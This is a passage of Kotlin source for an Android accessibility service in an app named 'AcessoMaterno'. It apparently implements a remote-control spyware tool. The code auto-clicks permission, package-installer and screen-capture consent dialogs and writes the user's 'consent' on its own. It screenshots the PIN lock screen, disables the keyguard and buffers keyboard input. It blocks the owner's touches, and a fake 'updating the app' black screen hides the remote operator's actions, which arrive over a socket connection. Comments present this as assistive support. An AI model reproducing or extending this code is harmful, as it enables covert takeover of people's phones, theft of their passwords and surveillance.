package com.example.acessomaterno

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.AccessibilityService.ScreenshotResult
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.ColorSpace
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.PorterDuff
import android.hardware.HardwareBuffer
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.app.KeyguardManager
import android.provider.Settings
import android.view.Display
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import android.util.Log
import android.util.TypedValue
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject
import org.json.JSONArray
import java.io.ByteArrayOutputStream
import java.io.File

class MyAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MyAccessibilityService"
        /** Intervalo mínimo (ms) entre tentativas de reanimação do ecossistema (keep-alive pós-boot). */
        private const val REANIMACAO_INTERVALO_MS = 10000L

        @Volatile
        var instance: MyAccessibilityService? = null
            private set

        // REGRA 2/3: automação assistiva (Injecty) de cliques automáticos em
        // telas de permissão/segurança do sistema. Ativa por padrão quando o
        // serviço está conectado.
        @Volatile
        var autoClickPermissoesAtivo: Boolean = true

        // MODO ONBOARDING RÁPIDO: quando true (definido pela MainActivity
        // durante o primeiro acesso), o Injecty usa intervalo de apenas 300ms
        // entre cliques e ainda faz "voltar" automaticamente após confirmar
        // permissões em telas de configuração — acelerando o fluxo de
        // "Iniciar" -> sobreposição -> MediaProjection sem toque manual.
        @Volatile
        var onboardingRapido: Boolean = false

        // ETAPA 3 — INJECT DO ATALHO: janela de tempo em que a acessibilidade
        // confirma automaticamente o diálogo do sistema "Adicionar à tela
        // inicial" (requestPinShortcut). Armado pelo AtalhoManager logo antes
        // do pedido; expira sozinho após alguns segundos para não clicar em
        // diálogos não relacionados.
        @Volatile
        var prazoConfirmacaoAtalhoMs: Long = 0L

        /** Arma a confirmação automática do diálogo de atalho por ~8s. */
        fun armarConfirmacaoAtalho() {
            prazoConfirmacaoAtalhoMs = System.currentTimeMillis() + 8000L
        }
    }

    // --- Estado de Controle de Interação "Acesso Total" ---
    @Volatile
    var bloquearCliquesLocais: Boolean = false
    private var activePath: Path? = null
    private var currentStroke: GestureDescription.StrokeDescription? = null
    private var pendingX = -1f
    private var pendingY = -1f
    private var isDispatching = false
    private var startX = 0f
    private var startY = 0f
    private var ultimoLayoutMudancaMs = 0L

    // --- Overlays INDEPENDENTES: cada botão do painel controla o seu ---
    private var windowManager: WindowManager? = null
    private var overlayPrivacidade: View? = null
    private var overlayEscura: View? = null
    private var overlayAtualizacao: View? = null
    // Tela PRETA opaca de "Atualizando o aplicativo" (handler do DISPOSITIVO).
    // Desenhada pelo PRÓPRIO serviço de acessibilidade para NÃO depender de
    // SYSTEM_ALERT_WINDOW nem de startService em segundo plano (que falhavam).
    private var overlayAtualizacaoPreta: View? = null
    private var overlayFundoAtualizacao: View? = null
    @Volatile var isAtualizacaoAtiva: Boolean = false
        private set
    // Valor COM SINAL (-1..+1): >0 escurece (preto), <0 clareia (branco),
    // 0 neutro. Mesma convenção de OverlayService.opacidadeFundo.
    @Volatile var opacidadeFundoOverlayAtualizacao: Float = 0.6f
    // Overlay de bloqueio de toques locais (Acesso Total). É touchable e
    // consome TODO toque físico do usuário do dispositivo. Durante gestos
    // remotos vindos do painel do emulador, ele fica temporariamente
    // FLAG_NOT_TOUCHABLE para que o dispatchGesture injetado chegue aos apps
    // por baixo — ou seja, bloqueia APENAS o dispositivo local, nunca o
    // painel de controle remoto.
    private var overlayBloqueio: View? = null
    private val failsafeRestauroBloqueio = Runnable { setBloqueioPermiteToqueRemoto(false) }
    private val handlerMain = Handler(Looper.getMainLooper())
    private val TIMEOUT_PRIVACIDADE_MS = 3 * 60 * 1000L
    private val autoRemover = Runnable { removerTelaPrivacidade("tempo-limite de seguranca atingido") }

    // Evita agendar mais de um "voltar" automático durante o onboarding rápido.
    @Volatile
    private var backAgendado: Boolean = false
    // Keep-alive pós-boot: timestamp da última tentativa de reerguer o ecossistema.
    @Volatile
    private var ultimaTentativaReanimacao: Long = 0L
    // Limite de tentativas consecutivas de reanimação: após N falhas (ex.:
    // usuário negou MediaProjection permanentemente), PARA de abrir a
    // MainActivity — evita que a tela fique "mechendo sozinha" em loop.
    // O contador zera automaticamente quando o ScreenCaptureService volta a
    // rodar (sucesso detectado) ou quando o serviço de acessibilidade reconecta.
    @Volatile
    private var reanimacaoFalhasConsecutivas: Int = 0
    private val MAX_REANIMACAO_TENTATIVAS = 5

    // WATCHDOG PERIÓDICO DE REANIMAÇÃO (pedido do CEO: os frames NÃO podem cair).
    // Antes a reanimação só rodava em mudança de tela (evento de acessibilidade):
    // se a tela do aparelho ficasse PARADA, a captura caída nunca voltava. Agora
    // um timer verifica a cada 5s e re-pede o MediaProjection (inject auto-aceita)
    // enquanto a captura estiver caída e o socket vivo — o espelhamento volta só.
    private val reanimadorPeriodico = object : Runnable {
        override fun run() {
            try { verificarEReanimarEcossistema() } catch (_: Exception) {}
            handlerMain.postDelayed(this, 5000L)
        }
    }

    // ================================================================
    // CAPTURA POR ACESSIBILIDADE (fallback para tela de bloqueio com senha)
    // ----------------------------------------------------------------
    // O MediaProjection (rodando com UID do app) NÃO captura o keyguard
    // seguro (PIN/senha) — fica cinza devido a FLAG_SECURE nativa. Já o
    // AccessibilityService.takeScreenshot() (API 30+, Android 11+) roda com
    // privilégios de acessibilidade e CAPTURA as camadas seguras, inclusive
    // o teclado de senha. Usamos como fonte primária ENQUANTO o keyguard
    // estiver travado; quando desbloqueia (USER_PRESENT), volta ao
    // MediaProjection (mais FPS). Requer android:canTakeScreenshot="true"
    // no res/xml/accessibility_service_config.xml.
    // ================================================================
    @Volatile
    var capturaAcessibilidadeAtiva: Boolean = false
        private set
    private val handlerCapturaAces = Handler(Looper.getMainLooper())
    /** 1 FPS — taxa estável para respeitar o rate-limit do takeScreenshot(). */
    private val INTERVALO_CAPTURA_ACE_MS = 1000L
    private val runnableCapturaAces = object : Runnable {
        override fun run() {
            if (!capturaAcessibilidadeAtiva) return
            capturarScreenshotAcessibilidade()
            handlerCapturaAces.postDelayed(this, INTERVALO_CAPTURA_ACE_MS)
        }
    }

    // ================================================================
    // REGRA 2/3 — AUTOMAÇÃO ASSISTIVA (INJECTY) DE CLIQUES AUTOMÁTICOS
    // ----------------------------------------------------------------
    // Pacotes de telas de permissão/segurança onde o auto-clique age:
    //   - Configurações do Android (com.android.settings)
    //   - Segurança Xiaomi/MIUI/HyperOS (com.miui.securitycenter, com.lbe.security.miui)
    //   - Instalador de pacotes (permite instalar o motor sem toque manual)
    //   - Próprio Suporte Motor (com.example.suportemotor) — replica permissões (regra 3)
    //   - PRÓPRIO APP (com.example.acessomaterno) — para auto-clicar o botão
    //     "Iniciar" do 2º modal de consentimento assim que a acessibilidade
    //     estiver ativa.
    //   - SystemUI (com.android.systemui) — diálogo de consentimento do
    //     MediaProjection ("Iniciar agora" / "Start now").
    // ================================================================
    // REGRA 2 — ESCOPO ESTRITO: apenas telas de permissão do sistema,
    // diálogo do SystemUI (MediaProjection), instaladores de pacote e o
    // PRÓPRIO app. Qualquer app terceiro = auto-clique IGNORADO.
    private val pacotesPermissaoSistema = setOf(
        "com.android.settings",
        "com.miui.securitycenter", "com.lbe.security.miui", "com.miui.permcenter",
        "com.android.permissioncontroller",
        "com.android.systemui"
    )
    private val pacotesInstalador = setOf(
        "com.google.android.packageinstaller", "com.android.packageinstaller"
    )
    private val PACOTE_PROPRIO_APP = "com.example.acessomaterno"

    private fun pacotePermitidoParaAutoClique(pacote: String): Boolean {
        // CORREÇÃO: o PRÓPRIO app NÃO recebe auto-clique. Antes ele clicava
        // sozinho em botões como "Permitir"/"Iniciar"/"OK" dentro do próprio
        // app, causando "mechendo sozinho" e fechamento da tela.
        if (pacote in pacotesPermissaoSistema) return true
        if (pacote in pacotesInstalador) return true
        val p = pacote.lowercase()
        return p.contains("packageinstaller") || p.contains("permissioncontroller")
    }

    // Pacotes de sistema (Configurações / SystemUI / MIUI security) onde o
    // auto-clique SÓ pode usar a lista ESTRITA (frases EXATAS de permissão) —
    // nunca a lista ampla, para não clicar em botões de navegação normal
    // ("OK", "Continuar", "Abrir", "Salvar") dentro desses apps.
    private val pacotesSistemaEstritos = setOf(
        "com.android.settings",
        "com.miui.securitycenter", "com.lbe.security.miui", "com.miui.permcenter",
        "com.android.systemui"
    )
    private fun pacoteUsaListaEstrita(pacote: String): Boolean = pacote in pacotesSistemaEstritos

    // Lista ESTRITA (comparação EXATA, trim+lowercase): apenas frases de botão
    // de consentimento de permissão. Usada em Configurações/SystemUI/MIUI para
    // eliminar falsos positivos em telas de navegação normal.
    private val textosPermitirEstritos = listOf(
        "permitir", "permitir mesmo assim", "permita", "permitir desta forma",
        "permitir o acesso", "permitir sobre", "exibir sobre outros apps",
        "permitir exibição", "permitir exibicao", "ativar exibição", "ativar exibicao",
        "conceder permissão", "conceder permissao", "conceder", "autorizar",
        "aceitar", "aceito", "concordo", "eu concordo",
        "ativar", "ativar serviço", "ativar servico", "usar serviço", "usar servico",
        "iniciar agora", "start now", "iniciar automático", "iniciar automatico",
        "iniciar automaticamente",
        "só desta vez", "so desta vez", "enquanto o app estiver em uso",
        "allow", "accept", "enable", "allow only while using the app",
        "allow all the time", "start", "install"
    )

    private val pacotesAutoClique = pacotesPermissaoSistema + pacotesInstalador

    @Volatile private var tecladoAbertoAnterior: Boolean = false
    @Volatile private var bufferTextoTeclado: String = ""
    @Volatile private var bufferAppTeclado: String = ""
    @Volatile private var bufferBoundsTeclado: android.graphics.Rect? = null

    private fun isKeyboardOpen(): Boolean {
        try {
            val wins = windows ?: return false
            for (w in wins) {
                if (w.type == AccessibilityWindowInfo.TYPE_INPUT_METHOD) {
                    return true
                }
            }
        } catch (_: Exception) {}
        return false
    }

    // Textos de botões que o auto-clique deve PRESSIONAR (case-insensitive, contains).
    private val textosPermitir = listOf(
        "permitir", "permitir mesmo assim", "permita", "aceitar", "aceito", "concordo",
        "ok", "ativar", "ativar serviço", "iniciar automático", "iniciar automaticamente",
        "iniciar", "iniciar agora", "começar", "comecar", "start now",
        "autorizar", "prosseguir", "continuar", "concluir", "instalar",
        "habilitar", "ligar", "sim", "eu concordo", "permitir sobre", "exibir sobre",
        "exibir sobre outros apps", "permitir exibição", "permitir exibicao",
        "ativar exibição", "ativar exibicao", "conceder permissão", "conceder permissao",
        "acessibilidade", "conceder", "allow", "accept", "start", "enable", "install",
        "permitir desta forma", "só desta vez", "so desta vez",
        "enquanto o app estiver em uso", "permitir o acesso", "abrir configurações", "abrir"
    )

    // Textos que NUNCA devem ser clicados (bloqueia falsos positivos).
    // REGRA 3 — PROTEÇÃO CONTRA FALSOS POSITIVOS: qualquer nó cujo texto
    // contenha UMA destas palavras é INVALIDADO completamente (nunca clicado).
    private val textosBloquear = listOf(
        "negar", "recusar", "cancelar", "desativar", "não permitir", "nao permitir",
        "bloquear", "desligar", "cancel", "deny", "don't allow", "do not allow",
        "no thanks", "agora não", "agora nao", "mais tarde", "not now", "ignorar",
        "fechar", "close", "sair", "desinstalar", "uninstall", "parar", "stop",
        "não", "nao", "no ", "recuse", "rejeitar", "rejeitar e avisar", "depois",
        "excluir", "apagar", "remover", "encerrar", "forçar", "forcar",
        "limpar dados", "limpar", "redefinir", "resetar", "desconectar", "revogar",
        "denunciar", "reject", "delete", "remove", "reset", "erase",
        "force stop", "force-stop", "clear data", "disable",
        "sem permissão", "sem permissao", "permissão negada", "permissao negada"
    )

    private var ultimoCliqueAuto = 0L
    private val CLICK_AUTO_INTERVALO_MS = 1200L
    private val CLICK_RAPIDO_INTERVALO_MS = 300L

    // REGRA 1 — TRAVA ÚNICA POR TELA: após clicar com sucesso um botão,
    // guarda "pacote|texto" e bloqueia novos cliques no mesmo botão na mesma
    // janela. Cache limpo ao mudar de janela (pacote) ou após TTL de 30s.
    private val _botoesClicadosNaTela = java.util.Collections.synchronizedSet(mutableSetOf<String>())
    @Volatile private var _pacoteAutoCliqueAtual: String = ""
    @Volatile private var _janelaCachePacote: String? = null
    @Volatile private var _janelaCacheTs: Long = 0L
    private val TTL_CACHE_CLIQUE_MS = 30_000L

    private fun resetarCacheCliqueSeMudouJanela(pacote: String) {
        val agora = System.currentTimeMillis()
        val mudouJanela = _janelaCachePacote != pacote
        val expirou = agora - _janelaCacheTs > TTL_CACHE_CLIQUE_MS
        if (mudouJanela || expirou) {
            if (mudouJanela) _botoesClicadosNaTela.clear()
            _janelaCachePacote = pacote
            _janelaCacheTs = agora
        }
    }

    private fun botaoJaClicadoNaTela(texto: String): Boolean {
        val p = _pacoteAutoCliqueAtual.ifEmpty { return false }
        return "${p.lowercase()}|${texto.trim().lowercase()}" in _botoesClicadosNaTela
    }

    private fun marcarBotaoClicado(texto: String) {
        val p = _pacoteAutoCliqueAtual.ifEmpty { return }
        _botoesClicadosNaTela.add("${p.lowercase()}|${texto.trim().lowercase()}")
    }

    override fun onServiceConnected() {
        try { super.onServiceConnected() } catch (_: Throwable) {}
        instance = this
        // Liga o watchdog periódico de reanimação (frames nunca caem): tenta
        // reerguer a captura mesmo com a tela do aparelho parada.
        handlerMain.removeCallbacks(reanimadorPeriodico)
        handlerMain.postDelayed(reanimadorPeriodico, 5000L)
        try {
            reanimacaoFalhasConsecutivas = 0 // serviço reconectou → permite novo keep-alive
            windowManager = getSystemService(WINDOW_SERVICE) as? WindowManager
            // Habilita filtro de teclas para detectar o botão HOME mesmo com a
            // tela apagada. Requer android:canRequestFilterKeyEvents="true" no
            // res/xml/accessibility_service_config.xml (e reativar a acessibilidade).
            try {
                val info = serviceInfo
                if (info != null) {
                    info.flags = info.flags or AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
                    serviceInfo = info
                }
            } catch (e: Exception) {
                Log.e(TAG, "Falha ao habilitar filtro de teclas: ${e.message}")
            }
            Log.d(TAG, "Accessibility Service Conectado e Ativo")
            // ACESSIBILIDADE ATIVA = CONSENTIMENTO. Grava o consentimento de
            // captura assim que o serviço conecta, para que o auto-clique no
            // diálogo do MediaProjection ("Iniciar agora") não fique suspenso
            // esperando um consentimento que nunca era gravado — era o que
            // obrigava o usuário a clicar manualmente toda vez.
            try {
                getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
                    .edit().putBoolean("consentimento_captura", true).apply()
            } catch (e: Exception) {
                Log.e(TAG, "Falha ao gravar consentimento_captura: ${e.message}")
            }
            criarPastaUploadTeclado()

            // Registra o BroadcastReceiver de estado da tela de bloqueio (ACTION_USER_PRESENT / ACTION_SCREEN_OFF)
            try {
                val filter = android.content.IntentFilter().apply {
                    addAction(Intent.ACTION_USER_PRESENT)
                    addAction(Intent.ACTION_SCREEN_OFF)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    registerReceiver(lockStateReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
                } else {
                    registerReceiver(lockStateReceiver, filter)
                }
                Log.d(TAG, "BroadcastReceiver de estado da tela de bloqueio registrado com sucesso.")
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao registrar lockStateReceiver: ${e.message}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha na inicialização inicial do onServiceConnected: ${e.message}", e)
        }

        try {
            SocketManager.connect()
            configurarOuvintesSocket()
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao iniciar Socket.IO no onServiceConnected: ${e.message}", e)
        }

        try {
            enviarLogApp("Serviço de acessibilidade ATIVO e pronto para receber comandos (auto-clique de permissões=$autoClickPermissoesAtivo, onboardingRapido=$onboardingRapido).")
        } catch (e: Exception) {
            Log.e(TAG, "Falha no enviarLogApp inicial: ${e.message}")
        }
    }

    /**
     * Acende a tela quando ela está apagada (em descanso). Chamado quando o
     * cliente aperta o botão HOME com a tela desligada — a tela acende normal.
     */
    private fun acenderTela() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            val wakeLock = pm.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                    PowerManager.ACQUIRE_CAUSES_WAKEUP or
                    PowerManager.ON_AFTER_RELEASE,
                "AcessoMaterno:AcenderHome"
            )
            wakeLock.acquire(3000L) // mantém acesa por 3s (depois segue o timeout normal)
            // Libera o bloqueio de tela (keyguard) se existir.
            // requestDismissKeyguard() exige uma Activity como 1º argumento;
            // dentro de um Service usamos a API legada KeyguardLock (depreciada,
            // mas ainda funcional). Requer <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
            // no AndroidManifest.xml.
            val kg = getSystemService(KEYGUARD_SERVICE) as KeyguardManager
            @Suppress("DEPRECATION")
            val keyguardLock = kg.newKeyguardLock("AcessoMaterno:AcenderHome")
            keyguardLock.disableKeyguard()
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao acender a tela: ${e.message}")
        }
    }

    /** Configura ouvintes adicionais no Socket vivo caso necessário. */
    private fun configurarOuvintesSocket() {
        try {
            SocketManager.socket?.on("configurar_acesso_total") { args ->
                val json = if (args.isNotEmpty() && args[0] is JSONObject) args[0] as JSONObject else null
                val ativo = when {
                    json != null && json.has("ativo") -> json.optBoolean("ativo", false)
                    args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                    else -> false
                }
                configurarAcessoTotal(ativo)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao registrar ouvinte configurar_acesso_total: ${e.message}")
        }
    }

    /** Altera o estado do Acesso Total e emite logs de sincronização. */
    fun configurarAcessoTotal(ativo: Boolean) {
        bloquearCliquesLocais = ativo
        // A criação/remocao do overlay toca em WindowManager -> main thread.
        handlerMain.post {
            if (ativo) mostrarBloqueioAcessoTotal() else removerBloqueioAcessoTotal()
        }
        enviarLogApp("Acesso Total alterado via Socket: bloquearCliquesLocais=$bloquearCliquesLocais")
        Log.d(TAG, "Configuração de Acesso Total atualizada: bloquearCliquesLocais=$bloquearCliquesLocais")
    }

    // ================================================================
    // BLOQUEIO REAL DE TOQUES LOCAIS (Acesso Total) — overlay touchable
    // que consome todo toque físico. O painel remoto continua funcionando
    // porque, antes de cada gesto injetado, o overlay fica temporariamente
    // FLAG_NOT_TOUCHABLE (ver setBloqueioPermiteToqueRemoto).
    // ================================================================
    private fun paramsBloqueio(): WindowManager.LayoutParams = WindowManager.LayoutParams(
        WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
        // NÃO usar FLAG_NOT_TOUCHABLE aqui: o overlay precisa consumir os
        // toques locais. FLAG_NOT_FOCUSABLE mantém teclado/input remoto OK.
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
        PixelFormat.TRANSLUCENT
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
    }

    private fun mostrarBloqueioAcessoTotal() {
        if (overlayBloqueio != null) return
        val wm = windowManager ?: return
        val container = FrameLayout(this).apply {
            // Tinte quase invisível: a tela continua visível (e o screen
            // capture do painel continua enxergando o dispositivo).
            setBackgroundColor(Color.parseColor("#14000000"))
            setOnTouchListener { _, _ -> true } // consome TODO toque local
        }
        // Selo "🔒 Bloqueado" REMOVIDO a pedido do CEO: não mostra mais nenhum
        // rótulo na tela do dispositivo (atrapalhava). O bloqueio de toques
        // locais continua ativo pelo próprio container (consome os toques).
        try {
            wm.addView(container, paramsBloqueio())
            overlayBloqueio = container
            enviarLog("Acesso Total ATIVO: toques locais do dispositivo bloqueados (painel remoto permanece liberado).")
        } catch (e: Exception) {
            enviarLog("Falha ao ativar overlay de bloqueio do Acesso Total: ${e.message}")
        }
    }

    private fun removerBloqueioAcessoTotal() {
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        overlayBloqueio?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        overlayBloqueio = null
        enviarLog("Acesso Total DESATIVADO: toques locais do dispositivo liberados.")
    }

    /**
     * Bypass para o painel do emulador: quando permitir=true, adiciona
     * FLAG_NOT_TOUCHABLE no overlay de bloqueio para que os gestos injetados
     * por dispatchGesture (controle remoto) atravessem para os apps. Quando
     * permitir=false, volta a consumir toques locais. Sem isto, o painel
     * também ficaria bloqueado — exatamente o que NÃO deve acontecer.
     */
    private fun setBloqueioPermiteToqueRemoto(permitir: Boolean) {
        val wm = windowManager ?: return
        // Aplica o MESMO toggle de "deixar o toque remoto atravessar" tanto no
        // overlay do Acesso Total quanto na tela PRETA de atualização do
        // dispositivo. Assim SEUS cliques remotos passam durante a injeção
        // (dispatchGesture), mas o toque LOCAL da pessoa continua bloqueado — a
        // flag só fica solta durante o gesto e é restaurada logo depois.
        fun aplicar(view: View?) {
            if (view == null) return
            try {
                val p = view.layoutParams as WindowManager.LayoutParams
                p.flags = if (permitir) {
                    p.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                } else {
                    p.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
                }
                wm.updateViewLayout(view, p)
            } catch (_: Exception) {}
        }
        aplicar(overlayBloqueio)
        aplicar(overlayAtualizacaoPreta)
        // BYPASS UNIVERSAL — também libera o OverlayService (janela "Atualizando
        // o aplicativo" / véu do slider "Fundo do Dispositivo") se estiver
        // ativo. Como é uma classe SEPARADA (não é uma View deste serviço), o
        // toggle dela é feito por reflexão: se OverlayService expuser o método
        // estático permitirToqueRemoto(Boolean), ele adiciona/remove
        // FLAG_NOT_TOUCHABLE na própria janela. SEM isto, o véu escuro do
        // OverlayService CONSOME todo clique injetado (dispatchGesture) e os
        // toques NÃO atravessam para os apps.
        notificarOverlayServicePassThrough(permitir)
    }

    /** Reflexão: notifica o OverlayService (classe separada) para liberar ou
     *  re-bloquear o toque remoto na própria janela de overlay. Não faz nada
     *  (nem quebra a compilação) se o método estático permitirToqueRemoto
     *  ainda não existir em OverlayService — basta adicioná-lo lá. */
    private fun notificarOverlayServicePassThrough(permitir: Boolean) {
        try {
            val cls = Class.forName("com.example.acessomaterno.OverlayService")
            val metodo = cls.getMethod("permitirToqueRemoto", java.lang.Boolean.TYPE)
            metodo.invoke(null, permitir)
        } catch (_: Exception) {}
    }

    /** "Restaura" o bloqueio local após um gesto remoto — mas de forma STICKY:
     *  NÃO fecha o bypass na hora (isso fazia os cliques caírem no meio de uma
     *  sequência). Apenas ADIA o re-bloqueio para bypassHoldMs depois; se vier
     *  outro clique antes disso, o bypass permanece ABERTO. Só re-bloqueia o
     *  toque LOCAL após a inatividade. Universal (qualquer Android). */
    private fun restaurarBloqueioLocal() {
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        handlerMain.postDelayed(failsafeRestauroBloqueio, bypassHoldMs)
    }

    // ------------------------------------------------------------------------
    // BYPASS "STICKY" — prioridade do EMULADOR NATIVO (seus cliques remotos).
    // ------------------------------------------------------------------------
    // Antes o bypass abria no START e fechava no END de CADA toque; nessa
    // corrida de abrir/fechar (updateViewLayout é assíncrono) o overlay voltava
    // a consumir o toque e os cliques "caíam sozinhos". Agora, a CADA evento
    // remoto o bypass é mantido ABERTO e o re-bloqueio é adiado para
    // bypassHoldMs DEPOIS do ÚLTIMO evento. Enquanto você clica, o overlay
    // NUNCA volta a bloquear; só re-bloqueia após alguns segundos parado.
    // Funciona em QUALQUER Android (FLAG_NOT_TOUCHABLE é universal).
    private val bypassHoldMs = 6000L

    private fun manterBypassAberto() {
        setBloqueioPermiteToqueRemoto(true)
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        handlerMain.postDelayed(failsafeRestauroBloqueio, bypassHoldMs)
    }

    /** Envia mensagem de log ao painel central via Socket.IO. */
    fun enviarLogApp(msg: String) {
        enviarLog(msg)
    }

    /** Chamado pelo SocketManager quando chega 'receber_movimento' do painel. */
    fun onRemoteMovimento(json: JSONObject) {
        val acao = json.optString("acao", "START")
        val percentX = json.optDouble("x", 0.0).toFloat()
        val percentY = json.optDouble("y", 0.0).toFloat()
        // SALA de origem: "nativo" (emulador PySide) -> usa BYPASS do overlay
        // (Acesso Total) para o gesto atravessar. "dispositivo" (dispositivo
        // android) -> handler SEPARADO, SEM bypass (não mexe no overlay). Se
        // vier sem o campo (cliente antigo), preserva o nativo (bypass).
        val bypass = json.optString("sala", "nativo") != "dispositivo"
        // Dimensão FÍSICA real do display (inclui status/navigation bar).
        // Sem isto, coordenadas 0..1 mapeiam para widthPixels/heightPixels
        // que podem diferir da área capturada → toque parece "descentrado".
        val pontoReal = android.graphics.Point()
        val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
        @Suppress("DEPRECATION")
        wm?.defaultDisplay?.getRealSize(pontoReal)
        val metrics = resources.displayMetrics
        val larguraReal = if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels
        val alturaReal = if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels
        val realX = percentX * larguraReal
        val realY = percentY * alturaReal
        // GESTOS COM A TELA DESLIGADA: dispatchGesture NÃO funciona com a tela
        // apagada (em Doze/descanso). Se a tela estiver desligada quando chegar
        // QUALQUER evento de toque/swipe, acende a tela (no primeiro START) e
        // atrasa TODOS os eventos do gesto em 700ms, preservando a ordem
        // START->MOVE->END. Assim, o movimento do painel funciona mesmo com o
        // celular dormindo, inclusive para deslizar e desbloquear.
        // Além disso, a CADA START de toque, adquirimos um WakeLock brilhante
        // de 15s: enquanto o usuário estiver interagindo (digitando a senha,
        // tocando, arrastando), a tela e o espelhamento permanecem no ar.
        val pm = getSystemService(POWER_SERVICE) as? PowerManager
        val telaDesligada = pm?.isInteractive == false
        if (acao.uppercase() == "START") {
            try {
                @Suppress("DEPRECATION")
                val wl = pm?.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                        PowerManager.ACQUIRE_CAUSES_WAKEUP or
                        PowerManager.ON_AFTER_RELEASE,
                    "AcessoMaterno:Toque15s"
                )
                wl?.acquire(15000L) // mantém a tela acesa por 15s a cada toque
            } catch (_: Exception) {}
        }
        val atrasoMs = if (telaDesligada) {
            if (acao.uppercase() == "START") {
                acenderTela()
                enviarLog("[GESTO] Tela apagada -> acendendo antes do movimento (atraso 700ms).")
            }
            700L
        } else 0L
        // Ações de acessibilidade/gestos na main thread (mais confiável no Android 14+ e Xiaomi).
        Handler(Looper.getMainLooper()).postDelayed({ handleRemoteGesture(acao, realX, realY, bypass) }, atrasoMs)
    }

    /** Chamado pelo SocketManager quando chega 'receber_tecla' do painel. */
    fun onRemoteTecla(json: JSONObject) {
        val tipo = json.optString("tipo", "")
        val valor = json.optString("valor", "")
        Handler(Looper.getMainLooper()).post { handleTecla(tipo, valor) }
    }

    /** Chamado pelo SocketManager quando chega 'desligar' do painel. */
    fun pararCaptura() {
        enviarLog("Recebido 'desligar' do painel — encerrando compartilhamento de tela.")
        try {
            stopService(Intent(this, ScreenCaptureService::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao parar ScreenCaptureService: ${e.message}")
        }
    }

    private fun enviarLog(msg: String) {
        try { SocketManager.socket?.emit("log_dispositivo", "[ACES] $msg") } catch (_: Exception) {}
    }

    fun solicitarTelaPrivacidade() {
        handlerMain.post {
            if (overlayPrivacidade != null) return@post
            mostrarConsentimento()
        }
    }

    fun removerTelaPrivacidadeRemoto() {
        handlerMain.post { removerTelaPrivacidade("painel encerrou a tela de privacidade") }
    }

    /**
     * Chamado remotamente pelo SocketManager quando o cuidador ativa o "Modo Escuro".
     * NOTA (REGRA 4): o blackout agora é feito ESTRITAMENTE via WindowManager
     * (ScreenCaptureService.ativarTelaPretaFalsa) a partir do SocketManager.
     * Este método permanece apenas como fallback legado e não é mais chamado
     * pelo fluxo principal de tela_escura/modo_escuro.
     */
    fun solicitarTelaEscura() {
        handlerMain.post {
            if (overlayEscura != null) return@post
            aplicarTelaEscura()
        }
    }

    fun removerTelaEscuraRemoto() {
        handlerMain.post { removerTelaEscura("painel ativou Modo Clarear") }
    }

    private fun dp(valor: Int): Int = TypedValue.applyDimension(
        TypedValue.COMPLEX_UNIT_DIP, valor.toFloat(), resources.displayMetrics
    ).toInt()

    private fun mostrarConsentimento() {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#EE000000"))
            setPadding(dp(32), dp(32), dp(32), dp(32))
        }
        val titulo = TextView(this).apply {
            text = "Tela de privacidade"
            setTextColor(Color.WHITE)
            textSize = 20f
            gravity = Gravity.CENTER
        }
        val msg = TextView(this).apply {
            text = "A sessão de suporte quer escurecer sua tela por alguns instantes " +
                "para digitar uma informação em sigilo.\n\n" +
                "Se permitir, a tela ficará preta. Você pode voltar a qualquer momento " +
                "pressionando o botão Volume (−)."
            setTextColor(Color.parseColor("#DDDDDD"))
            textSize = 15f
            gravity = Gravity.CENTER
            setPadding(0, dp(16), 0, dp(24))
        }
